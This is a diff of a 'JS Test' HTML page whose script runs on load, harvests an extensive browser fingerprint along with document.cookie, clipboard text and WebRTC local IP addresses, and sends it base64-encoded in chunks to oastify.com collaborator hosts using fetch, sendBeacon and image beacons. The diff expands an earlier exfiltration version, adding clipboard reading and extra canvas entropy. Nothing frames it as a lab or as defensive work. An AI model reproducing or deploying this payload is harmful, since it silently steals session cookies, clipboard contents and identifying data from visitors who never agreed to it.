@@ -1,20 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>JS Test</title>
 </head>
 <body>
     Testing...
     <script>
     (async () => {
+        'use strict';
+
+        // ---------- Helpers ----------
+        // Convert a string to base64 (UTF‑8 safe)
+        function toBase64(str) {
+            const bytes = new TextEncoder().encode(str);
+            const binary = String.fromCharCode(...bytes);
+            return btoa(binary);
+        }
+
+        // Send a chunk (or any data) to the OAST server
+        function sendToOast(session, chunkIndex, totalChunks, dataBase64) {
+            const baseUrl = 'https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/';
+            const url = `${baseUrl}?session=${session}&chunk=${chunkIndex}&total=${totalChunks}&data=${encodeURIComponent(dataBase64)}`;
+
+            // Multiple delivery methods for reliability
+            try { fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch (_) {}
+            try { if (navigator.sendBeacon) navigator.sendBeacon(url); } catch (_) {}
+            try { new Image().src = url; } catch (_) {}
+        }
+
+        // ---------- Main collection ----------
         const session = Math.random().toString(36).slice(2) + Date.now().toString(36);
-        const parts = [];   // will hold independent objects
+        const data = {};
 
-        // ========== COLLECTION ==========
-        // We collect into separate logical groups so each can be sent standalone
-
-        // --- 1. Navigator + Client Hints ---
-        const nav = {};
+        // ---- 1. Navigator & Client Hints ----
+        data.navigator = {};
         try {
             const navProps = [
                 'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
@@ -23,73 +43,77 @@
                 'pdfViewerEnabled','webdriver','buildID','oscpu'
             ];
             navProps.forEach(k => {
-                try { nav[k] = navigator[k]; } catch(e) {}
+                try { data.navigator[k] = navigator[k]; } catch (_) {}
             });
             if (navigator.userAgentData) {
                 try {
-                    nav.uaData = await navigator.userAgentData.getHighEntropyValues([
+                    data.navigator.uaData = await navigator.userAgentData.getHighEntropyValues([
                         'platform','platformVersion','architecture','model','uaFullVersion',
                         'fullVersionList','bitness','wow64','formFactors'
                     ]);
-                    nav.uaDataMobile = navigator.userAgentData.mobile;
-                    nav.uaDataBrands = navigator.userAgentData.brands;
-                } catch(e) {}
+                    data.navigator.uaDataMobile = navigator.userAgentData.mobile;
+                    data.navigator.uaDataBrands = navigator.userAgentData.brands;
+                } catch (_) {}
             }
-        } catch(e) {}
-        parts.push({ type: 'navigator', session, data: nav });
+        } catch (_) {}
 
-        // --- 2. Screen + Window ---
-        const display = {};
+        // ---- 2. Screen & Window ----
+        data.display = {};
         try {
-            ['width','height','availWidth','availHeight','colorDepth','pixelDepth',
-             'availLeft','availTop','orientation'].forEach(k => {
-                try { display['screen_' + k] = screen[k]; } catch(e) {}
-            });
-            display.window = {
+            const screenProps = [
+                'width','height','availWidth','availHeight','colorDepth','pixelDepth',
+                'availLeft','availTop'
+            ];
+            screenProps.forEach(k => { data.display['screen_' + k] = screen[k]; });
+            if (screen.orientation) {
+                data.display.screen_orientation = {
+                    type: screen.orientation.type,
+                    angle: screen.orientation.angle
+                };
+            }
+            data.display.window = {
                 innerWidth, innerHeight, outerWidth, outerHeight,
                 screenX, screenY, screenLeft, screenTop,
                 devicePixelRatio, length: window.length, name: window.name,
                 opener: !!window.opener, isFramed: self !== top,
                 crossOriginIsolated, isSecureContext, origin: location.origin
             };
-            try { top.location.href; display.window.isCrossOriginFramed = false; }
-            catch(e) { display.window.isCrossOriginFramed = true; }
-        } catch(e) {}
-        parts.push({ type: 'display', session, data: display });
+            try { top.location.href; data.display.window.isCrossOriginFramed = false; }
+            catch (_) { data.display.window.isCrossOriginFramed = true; }
+        } catch (_) {}
 
-        // --- 3. Location + Document + Locale ---
-        const page = {};
+        // ---- 3. Location, Document & Locale ----
+        data.page = {};
         try {
-            page.location = {
+            data.page.location = {
                 href: location.href, protocol: location.protocol,
                 host: location.host, hostname: location.hostname,
                 port: location.port, pathname: location.pathname,
                 search: location.search, hash: location.hash, origin: location.origin
             };
-            page.document = {
+            data.page.document = {
                 title: document.title, referrer: document.referrer,
                 domain: document.domain, cookie: document.cookie,
                 lastModified: document.lastModified, readyState: document.readyState,
                 characterSet: document.characterSet, compatMode: document.compatMode
             };
-            page.locale = Intl.DateTimeFormat().resolvedOptions();
-            page.timezoneOffset = new Date().getTimezoneOffset();
-            page.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            page.date = new Date().toString();
-        } catch(e) {}
-        parts.push({ type: 'page', session, data: page });
+            data.page.locale = Intl.DateTimeFormat().resolvedOptions();
+            data.page.timezoneOffset = new Date().getTimezoneOffset();
+            data.page.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.page.date = new Date().toString();
+        } catch (_) {}
 
-        // --- 4. Plugins + MIME + Features ---
-        const browser = {};
+        // ---- 4. Plugins, MIME & Features ----
+        data.browser = {};
         try {
-            browser.plugins = Array.from(navigator.plugins || []).map(p => ({
+            data.browser.plugins = Array.from(navigator.plugins || []).map(p => ({
                 name: p.name, filename: p.filename, description: p.description
             }));
-            browser.pluginsCount = navigator.plugins?.length || 0;
-            browser.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
+            data.browser.pluginsCount = navigator.plugins?.length || 0;
+            data.browser.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
                 type: m.type, description: m.description, suffixes: m.suffixes
             }));
-            browser.features = {
+            data.browser.features = {
                 wasm: typeof WebAssembly === 'object',
                 sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
                 bigInt: typeof BigInt !== 'undefined',
@@ -106,13 +130,14 @@
                 indexedDB: 'indexedDB' in window,
                 cacheAPI: 'caches' in window
             };
-            browser.historyLength = history.length;
-            browser.notificationPermission = Notification.permission;
-        } catch(e) {}
-        parts.push({ type: 'browser', session, data: browser });
+            data.browser.historyLength = history.length;
+            if (typeof Notification !== 'undefined') {
+                data.browser.notificationPermission = Notification.permission;
+            }
+        } catch (_) {}
 
-        // --- 5. WebGL + WebGL2 + Canvas ---
-        const graphics = {};
+        // ---- 5. WebGL, WebGL2 & Canvas ----
+        data.graphics = {};
         try {
             const c = document.createElement('canvas');
             const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
@@ -124,8 +149,8 @@
                         unmaskedVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                         unmaskedRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                     }
-                } catch(e) {}
-                graphics.webgl = {
+                } catch (_) {}
+                data.graphics.webgl = {
                     vendor: gl.getParameter(gl.VENDOR),
                     renderer: gl.getParameter(gl.RENDERER),
                     version: gl.getParameter(gl.VERSION),
@@ -136,13 +161,13 @@
             }
             const gl2 = document.createElement('canvas').getContext('webgl2');
             if (gl2) {
-                graphics.webgl2 = {
+                data.graphics.webgl2 = {
                     version: gl2.getParameter(gl2.VERSION),
                     vendor: gl2.getParameter(gl2.VENDOR),
                     renderer: gl2.getParameter(gl2.RENDERER)
                 };
             }
-            // Canvas fingerprint
+            // Extended canvas fingerprint
             const c2 = document.createElement('canvas');
             const ctx = c2.getContext('2d');
             ctx.textBaseline = 'top';
@@ -154,16 +179,26 @@
             ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 15);
             ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
             ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 4, 17);
-            graphics.canvas = c2.toDataURL();
-        } catch(e) {}
-        parts.push({ type: 'graphics', session, data: graphics });
+            // Add a second canvas with different text to increase entropy
+            const c3 = document.createElement('canvas');
+            const ctx3 = c3.getContext('2d');
+            ctx3.textBaseline = 'bottom';
+            ctx3.font = '18px Times New Roman';
+            ctx3.fillStyle = '#000';
+            ctx3.fillText('The quick brown fox jumps over the lazy dog', 10, 30);
+            ctx3.strokeStyle = '#f00';
+            ctx3.lineWidth = 2;
+            ctx3.strokeRect(5, 5, 200, 40);
+            data.graphics.canvas1 = c2.toDataURL();
+            data.graphics.canvas2 = c3.toDataURL();
+        } catch (_) {}
 
-        // --- 6. Performance + Connection + Battery + Storage ---
-        const system = {};
+        // ---- 6. Performance, Connection, Battery, Storage ----
+        data.system = {};
         try {
-            system.performance = { now: performance.now(), timeOrigin: performance.timeOrigin };
+            data.system.performance = { now: performance.now(), timeOrigin: performance.timeOrigin };
             if (performance.memory) {
-                system.performance.memory = {
+                data.system.performance.memory = {
                     usedJSHeapSize: performance.memory.usedJSHeapSize,
                     totalJSHeapSize: performance.memory.totalJSHeapSize,
                     jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
@@ -171,84 +206,90 @@
             }
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
-                system.connection = {
+                data.system.connection = {
                     effectiveType: conn.effectiveType, downlink: conn.downlink,
                     rtt: conn.rtt, saveData: conn.saveData, type: conn.type
                 };
             }
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                system.battery = {
+                data.system.battery = {
                     charging: b.charging, level: b.level,
                     chargingTime: b.chargingTime, dischargingTime: b.dischargingTime
                 };
             }
             if (navigator.storage?.estimate) {
-                system.storageEstimate = await navigator.storage.estimate();
+                data.system.storageEstimate = await navigator.storage.estimate();
             }
-            system.localStorageLen = localStorage.length;
-            system.sessionStorageLen = sessionStorage.length;
-            system.hardware = {
+            try { data.system.localStorageLen = localStorage.length; } catch (_) {}
+            try { data.system.sessionStorageLen = sessionStorage.length; } catch (_) {}
+            data.system.hardware = {
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 deviceMemory: navigator.deviceMemory,
                 maxTouchPoints: navigator.maxTouchPoints
             };
-        } catch(e) {}
-        parts.push({ type: 'system', session, data: system });
+        } catch (_) {}
 
-        // --- 7. Media Devices + Permissions + Media Queries ---
-        const media = {};
+        // ---- 7. Media Devices, Permissions & Media Queries ----
+        data.media = {};
         try {
             const devs = await navigator.mediaDevices.enumerateDevices();
-            media.mediaDevices = devs.map(d => ({
+            data.media.mediaDevices = devs.map(d => ({
                 kind: d.kind,
                 label: d.label ? '[redacted]' : '',
                 deviceId: d.deviceId ? d.deviceId.slice(0, 8) + '...' : '',
                 groupId: d.groupId ? d.groupId.slice(0, 8) + '...' : ''
             }));
-            media.mediaDevicesCount = devs.length;
+            data.media.mediaDevicesCount = devs.length;
 
             const names = ['camera','microphone','geolocation','notifications',
                            'clipboard-read','clipboard-write','persistent-storage'];
-            media.permissions = {};
+            data.media.permissions = {};
             for (const n of names) {
                 try {
                     const r = await navigator.permissions.query({name: n});
-                    media.permissions[n] = r.state;
-                } catch(e) {}
+                    data.media.permissions[n] = r.state;
+                } catch (_) {}
             }
-            media.mediaQueries = {
+            data.media.mediaQueries = {
                 prefersColorScheme: matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
                 prefersReducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
                 hover: matchMedia('(hover: hover)').matches,
                 pointer: matchMedia('(pointer: coarse)').matches ? 'coarse' :
                          matchMedia('(pointer: fine)').matches ? 'fine' : 'none'
             };
-        } catch(e) {}
-        parts.push({ type: 'media', session, data: media });
+        } catch (_) {}
 
-        // --- 8. WebRTC + Audio + Fonts ---
-        const fingerprint = {};
+        // ---- 8. WebRTC, Audio & Fonts ----
+        data.fingerprint = {};
         try {
-            // WebRTC
+            // WebRTC – wait for ICE gathering to finish
             const pc = new RTCPeerConnection({iceServers: []});
             pc.createDataChannel('');
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
-            fingerprint.webrtc = [];
+            data.fingerprint.webrtc = [];
+            const candidates = [];
             pc.onicecandidate = e => {
-                if (!e?.candidate?.candidate) return;
-                const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                if (m) fingerprint.webrtc.push(m[1]);
+                if (e.candidate && e.candidate.candidate) {
+                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (m) candidates.push(m[1]);
+                }
             };
-            await new Promise(r => setTimeout(r, 900));
+            await new Promise((resolve) => {
+                if (pc.iceGatheringState === 'complete') resolve();
+                else pc.onicegatheringstatechange = () => {
+                    if (pc.iceGatheringState === 'complete') resolve();
+                };
+            });
+            data.fingerprint.webrtc = [...new Set(candidates)];
             pc.close();
 
             // Audio
             const AC = window.AudioContext || window.webkitAudioContext;
             if (AC) {
                 const ctx = new AC();
-                fingerprint.audio = {
+                data.fingerprint.audio = {
                     sampleRate: ctx.sampleRate,
                     state: ctx.state,
                     baseLatency: ctx.baseLatency || null,
@@ -257,7 +298,7 @@
                 ctx.close();
             }
 
-            // Fonts
+            // Font detection
             const baseFonts = ['monospace', 'sans-serif', 'serif'];
             const fontList = ['Arial','Arial Black','Calibri','Comic Sans MS','Courier New',
                               'Georgia','Impact','Times New Roman','Trebuchet MS','Verdana',
@@ -268,46 +309,126 @@
             document.body.appendChild(h);
             const defaults = {};
             baseFonts.forEach(b => { h.style.fontFamily = b; defaults[b] = h.offsetWidth; });
-            fingerprint.detectedFonts = [];
+            data.fingerprint.detectedFonts = [];
             fontList.forEach(f => {
                 let found = false;
                 baseFonts.forEach(b => {
                     h.style.fontFamily = `"${f}",${b}`;
                     if (h.offsetWidth !== defaults[b]) found = true;
                 });
-                if (found) fingerprint.detectedFonts.push(f);
+                if (found) data.fingerprint.detectedFonts.push(f);
             });
             document.body.removeChild(h);
-        } catch(e) {}
-        parts.push({ type: 'fingerprint', session, data: fingerprint });
+        } catch (_) {}
 
-        // ========== SEND EACH PART AS STANDALONE BASE64 ==========
-        const total = parts.length;
+        // ---- 9. Additional advanced APIs ----
+        data.extra = {};
+        try {
+            // Media Capabilities
+            if (navigator.mediaCapabilities) {
+                const mc = navigator.mediaCapabilities;
+                const videoConfig = { type: 'file', video: { contentType: 'video/mp4', width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } };
+                const audioConfig = { type: 'file', audio: { contentType: 'audio/mp4', channels: 2, bitrate: 128000, samplerate: 44100 } };
+                try {
+                    data.extra.mediaCapabilities = {
+                        video: await mc.decodingInfo(videoConfig),
+                        audio: await mc.decodingInfo(audioConfig)
+                    };
+                } catch (_) {}
+            }
 
-        parts.forEach((partObj, index) => {
-            try {
-                const json = JSON.stringify(partObj);
-                const b64 = btoa(unescape(encodeURIComponent(json)));
+            // Virtual Keyboard (mobile)
+            if (navigator.virtualKeyboard) {
+                data.extra.virtualKeyboard = {
+                    boundingRect: navigator.virtualKeyboard.boundingRect,
+                    overlaysContent: navigator.virtualKeyboard.overlaysContent,
+                    geometrychange: !!navigator.virtualKeyboard.ongeometrychange
+                };
+            }
 
-                const url = `https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/` +
-                            `?session=${session}&part=${index + 1}&total=${total}&type=${partObj.type}` +
-                            `&data=${encodeURIComponent(b64)}`;
+            // XR
+            if (navigator.xr) {
+                data.extra.xr = {
+                    isSessionSupported: await navigator.xr.isSessionSupported('immersive-vr'),
+                    isHandTracking: 'hand' in navigator.xr
+                };
+            }
 
-                // Multiple delivery methods
-                try { fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch(e) {}
-                try { if (navigator.sendBeacon) navigator.sendBeacon(url); } catch(e) {}
-                try { new Image().src = url; } catch(e) {}
-            } catch(e) {}
+            // Wake Lock
+            if (navigator.wakeLock) {
+                try {
+                    const wl = await navigator.wakeLock.request('screen');
+                    data.extra.wakeLock = { type: wl.type, released: false };
+                    wl.release();
+                    data.extra.wakeLock.released = true;
+                } catch (_) {}
+            }
+
+            // Clipboard (read text)
+            if (navigator.clipboard) {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    data.extra.clipboardText = text || '';
+                } catch (_) {}
+            }
+
+            // Gamepads
+            if (navigator.getGamepads) {
+                const pads = navigator.getGamepads();
+                data.extra.gamepads = pads ? Array.from(pads).filter(Boolean).map(g => ({
+                    id: g.id, index: g.index, connected: g.connected,
+                    mapping: g.mapping, axesLength: g.axes.length, buttonsLength: g.buttons.length
+                })) : [];
+            }
+
+            // Media Session
+            if (navigator.mediaSession) {
+                data.extra.mediaSession = {
+                    metadata: !!navigator.mediaSession.metadata,
+                    playbackState: navigator.mediaSession.playbackState,
+                    actionHandlers: ['play','pause','seekbackward','seekforward','previoustrack','nexttrack'].filter(a =>
+                        navigator.mediaSession.setActionHandler ? true : false
+                    )
+                };
+            }
+
+            // Presentation API
+            if (navigator.presentation) {
+                data.extra.presentation = {
+                    defaultRequest: !!navigator.presentation.defaultRequest,
+                    receiver: !!navigator.presentation.receiver
+                };
+            }
+
+            // Share API
+            if (navigator.share) {
+                data.extra.share = { canShare: navigator.canShare ? navigator.canShare({ title: 'test' }) : false };
+            }
+        } catch (_) {}
+
+        // ---------- Send in 3 chunks ----------
+        const json = JSON.stringify({ session, data });
+        const totalLen = json.length;
+        const chunkSize = Math.ceil(totalLen / 3);
+        const chunks = [];
+        for (let i = 0; i < 3; i++) {
+            const start = i * chunkSize;
+            const end = Math.min(start + chunkSize, totalLen);
+            chunks.push(json.slice(start, end));
+        }
+
+        // Encode each chunk to base64 and send
+        chunks.forEach((chunk, idx) => {
+            const b64 = toBase64(chunk);
+            sendToOast(session, idx + 1, 3, b64);
         });
 
-        // Optional: final "done" marker
-        try {
-            const doneUrl = `https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/` +
-                            `?session=${session}&part=done&total=${total}`;
-            fetch(doneUrl, { mode: 'no-cors' }).catch(()=>{});
-            new Image().src = doneUrl;
-        } catch(e) {}
-
+        // Done marker
+        setTimeout(() => {
+            const doneUrl = `https://l2orezrwaf56bptlx6279r9an1tshi57.oastify.com/?session=${session}&part=done&total=3`;
+            try { fetch(doneUrl, { mode: 'no-cors' }).catch(() => {}); } catch (_) {}
+            try { new Image().src = doneUrl; } catch (_) {}
+        }, 500);
     })();
     </script>
 </body>
